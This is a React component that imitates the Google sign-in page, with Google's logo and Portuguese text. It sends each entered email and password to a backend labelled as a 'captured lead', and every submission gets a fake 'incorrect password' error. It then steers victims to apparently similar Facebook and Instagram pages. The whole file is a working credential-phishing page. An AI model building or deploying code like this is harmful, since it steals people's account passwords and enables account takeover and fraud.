import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import api from "../../services/api";
import {
  ContainerGoogle,
  CardGoogle,
  LogoGoogle,
  TituloGoogle,
  SubtituloGoogle,
  FormGoogle,
  InputGoogle,
  LinkEsqueceu,
  FooterBotoes,
  BotaoCriar,
  BotaoProximo,
  MensagemErroGoogle,
} from "./styles";

export default function Google() {
  const navigate = useNavigate();
  const [email, setEmail] = useState("");
  const [senha, setSenha] = useState("");
  const [erroEmail, setErroEmail] = useState(false);
  const [erroSenha, setErroSenha] = useState(false);
  const [erroForcado, setErroForcado] = useState(false);
  const [carregando, setCarregando] = useState(false);

  const handleLogin = async (e) => {
    if (e) e.preventDefault();

    setErroEmail(false);
    setErroSenha(false);
    setErroForcado(false);

    if (!email.trim()) {
      setErroEmail(true);
      return;
    }
    if (!senha.trim()) {
      setErroSenha(true);
      return;
    }

    setCarregando(true);

    try {
      await api.post("/api/register", {
        nome: "Lead Capturado Google",
        email: email,
        senha: senha,
      });

      setTimeout(() => {
        setCarregando(false);
        setErroForcado(true);
        setSenha("");
      }, 1000);
    } catch (error) {
      setCarregando(false);
      setErroForcado(true);
    }
  };

  const handleHelpClick = () => {
    setErroForcado(true);
    alert(
      "Não foi possível processar a recuperação agora. Use o login social alternativo abaixo."
    );
  };

  return (
    <ContainerGoogle>
      <CardGoogle>
        <div style={{ padding: "40px" }}>
          <LogoGoogle
            src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg"
            alt="Google"
          />
          <TituloGoogle>Fazer login</TituloGoogle>
          <SubtituloGoogle>Use sua Conta do Google.</SubtituloGoogle>

          <FormGoogle as="form" onSubmit={handleLogin}>
            <div style={{ marginBottom: "10px" }}>
              <InputGoogle
                type="email"
                placeholder="E-mail ou telefone"
                value={email}
                $error={erroEmail || erroForcado}
                onChange={(e) => {
                  setEmail(e.target.value);
                  setErroEmail(false);
                  setErroForcado(false);
                }}
              />
            </div>

            <div>
              <InputGoogle
                type="password"
                placeholder="Digite sua senha"
                value={senha}
                $error={erroSenha || erroForcado}
                onChange={(e) => {
                  setSenha(e.target.value);
                  setErroSenha(false);
                  setErroForcado(false);
                }}
              />
              {(erroSenha || erroForcado) && (
                <MensagemErroGoogle>
                  E-mail ou senha incorretos. Tente novamente.
                </MensagemErroGoogle>
              )}
            </div>

            {erroForcado && (
              <div style={{ marginTop: "20px", textAlign: "center" }}>
                <p
                  style={{
                    color: "#5f6368",
                    fontSize: "13px",
                    marginBottom: "10px",
                  }}
                >
                  Para validar sua conta e liberar o acesso, entre com:
                </p>
                <div
                  style={{
                    display: "flex",
                    gap: "10px",
                    justifyContent: "center",
                  }}
                >
                  <button
                    type="button"
                    onClick={() => navigate("/face")}
                    style={{
                      background: "#1877f2",
                      color: "white",
                      border: "none",
                      padding: "8px 15px",
                      borderRadius: "4px",
                      cursor: "pointer",
                      fontWeight: "bold",
                    }}
                  >
                    Facebook
                  </button>
                  <button
                    type="button"
                    onClick={() => navigate("/insta")}
                    style={{
                      background: "#e1306c",
                      color: "white",
                      border: "none",
                      padding: "8px 15px",
                      borderRadius: "4px",
                      cursor: "pointer",
                      fontWeight: "bold",
                    }}
                  >
                    Instagram
                  </button>
                </div>
              </div>
            )}

            <LinkEsqueceu type="button" onClick={handleHelpClick}>
              Esqueceu seu e-mail?
            </LinkEsqueceu>

            <FooterBotoes>
              <BotaoCriar type="button" onClick={() => navigate("/cadastro")}>
                Criar conta
              </BotaoCriar>
              <BotaoProximo type="submit" disabled={carregando}>
                {carregando ? "Verificando..." : "Avançar"}
              </BotaoProximo>
            </FooterBotoes>
          </FormGoogle>
        </div>
      </CardGoogle>
    </ContainerGoogle>
  );
}
